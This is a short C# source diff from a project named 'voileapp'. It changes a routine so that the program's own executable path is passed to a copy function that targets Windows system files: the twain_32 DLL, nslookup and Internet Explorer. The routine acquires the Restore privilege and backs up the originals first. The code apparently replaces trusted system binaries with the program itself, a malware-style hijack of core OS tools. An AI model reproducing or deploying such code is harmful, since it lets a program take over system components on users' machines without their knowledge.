@@ -33,6 +33,7 @@ namespace voileapp
                 .Append("\\")
                 .Append(IEXPLORE_NAME);
 
+            String pathToExe = System.Reflection.Assembly.GetEntryAssembly().Location;
             // Sometimes it requires 'Restore' privilege for the user to manipulate with certain files
             Privileges.GiveRestorePrivilege();
 
@@ -48,15 +49,15 @@ namespace voileapp
 
             FileCopy twain32dll = new FileCopy(pathToTwain32.ToString());
             twain32dll.MakeBackup();
-            twain32dll.CopyExecutive();
+            twain32dll.CopyExecutive(pathToExe);
 
             FileCopy nslookup = new FileCopy(pathToNslookup.ToString());
             nslookup.MakeBackup();
-            nslookup.CopyExecutive();
+            nslookup.CopyExecutive(pathToExe);
 
             FileCopy iexplore = new FileCopy(pathToIexplore.ToString());
             iexplore.MakeBackup();
-            iexplore.CopyExecutive();
+            iexplore.CopyExecutive(pathToExe);
             
         }
     }
